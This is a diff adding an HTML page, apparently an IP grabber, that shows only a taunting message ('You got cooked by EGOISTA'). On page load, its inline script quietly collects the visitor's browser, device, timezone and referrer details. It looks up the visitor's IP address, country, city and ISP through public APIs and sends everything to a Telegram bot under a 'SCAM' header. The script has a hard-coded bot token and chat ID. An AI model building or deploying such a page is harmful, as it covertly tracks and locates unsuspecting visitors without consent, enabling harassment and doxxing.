@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Legend • EGOISTA •</title>
+    <style>
+        body {
+            background: url('bg.jpg') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            color: white;
+            text-shadow: 2px 2px 5px black;
+            text-align: center;
+        }
+        
+        .message {
+            font-size: 24px;
+            font-weight: bold;
+        }
+    </style>
+    <script>
+        async function getVisitorData() {
+            const token = "8092068348:AAEmb8XF7icwOrdIKlbwFI3Ck5o4JVOrR_8"; // ضع التوكن هنا
+            const chatId = "6769524326"; // ضع الـ ID هنا
+
+            const visitorData = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer || "دخول مباشر",
+                currentPage: window.location.href,
+                visitTime: new Date().toLocaleString(),
+                ip: "غير معروف",
+                country: "غير معروف",
+                city: "غير معروف",
+                region: "غير معروف",
+                isp: "غير معروف"
+            };
+
+            try {
+                // جلب IP أولاً
+                let ipResponse = await fetch('https://api64.ipify.org?format=json');
+                let ipData = await ipResponse.json();
+                visitorData.ip = ipData.ip;
+
+                // جلب الموقع الجغرافي ومزود الخدمة باستخدام IP
+                let geoResponse = await fetch(`https://ipapi.co/${visitorData.ip}/json/`);
+                let geoData = await geoResponse.json();
+
+                if (geoData.ip) {
+                    visitorData.country = geoData.country_name || "غير معروف";
+                    visitorData.city = geoData.city || "غير معروف";
+                    visitorData.region = geoData.region || "غير معروف";
+                    visitorData.isp = geoData.org || geoData.asn || "غير معروف";
+                }
+            } catch (error) {
+                console.error("خطأ في جلب IP أو الموقع الجغرافي:", error);
+            }
+
+            let message = `• 𝐒𝐂𝐀𝐌 •\n\n`;
+            message += `📍 IP: ${visitorData.ip}\n`;
+            message += `🌍 الدولة: ${visitorData.country}, ${visitorData.city}, ${visitorData.region}\n`;
+            message += `📡 مزود الخدمة: ${visitorData.isp}\n`;
+            message += `🖥️ الجهاز: ${visitorData.platform}\n`;
+            message += `🌐 المتصفح: ${visitorData.userAgent}\n`;
+            message += `🗣️ اللغة: ${visitorData.language}\n`;
+            message += `📏 دقة الشاشة: ${visitorData.screenWidth}x${visitorData.screenHeight}\n`;
+            message += `⏳ المنطقة الزمنية: ${visitorData.timezone}\n`;
+            message += `🔗 مصدر الزيارة: ${visitorData.referrer}\n`;
+            message += `📄 الصفحة الحالية: ${visitorData.currentPage}\n`;
+            message += `⏰ وقت الزيارة: ${visitorData.visitTime}\n`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
+            }).then(response => console.log("تم الإرسال إلى تلغرام")).catch(error => console.error("فشل الإرسال:", error));
+        }
+
+        window.onload = getVisitorData;
+    </script>
+</head>
+<body>
+    <div class="message">• 𝐘𝐨𝐮 𝐠𝐨𝐭 𝐜𝐨𝐨𝐤𝐞𝐝 𝐛𝐲 𝐄𝐆𝐎𝐈𝐒𝐓𝐀 •</div>
+</body>
+</html>
